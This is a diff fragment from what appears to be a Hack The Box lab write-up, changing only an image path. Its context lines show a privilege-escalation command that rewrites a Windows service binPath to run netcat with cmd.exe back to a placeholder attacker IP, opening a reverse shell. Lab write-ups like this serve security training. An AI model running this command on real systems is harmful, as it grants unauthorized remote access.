@@ -95,7 +95,7 @@ Again, I had to view the write-up to see where to go from here. From the command
 
 `sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <YOUR-IP> 1234"`. After having a netcat listener setup on another tab, I was able to get a connection:
 
-![](<../../.gitbook/assets/image (330) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (330) (1) (1) (1) (1).png>)
 
 The official walk-through got me to become root, however, I was not able to do anything on the machine. I then found this [write-up](https://readysetexploit.wordpress.com/2021/10/12/hack-the-box-return/) that helped me setup a proper shell. Here are the commands I used:
 
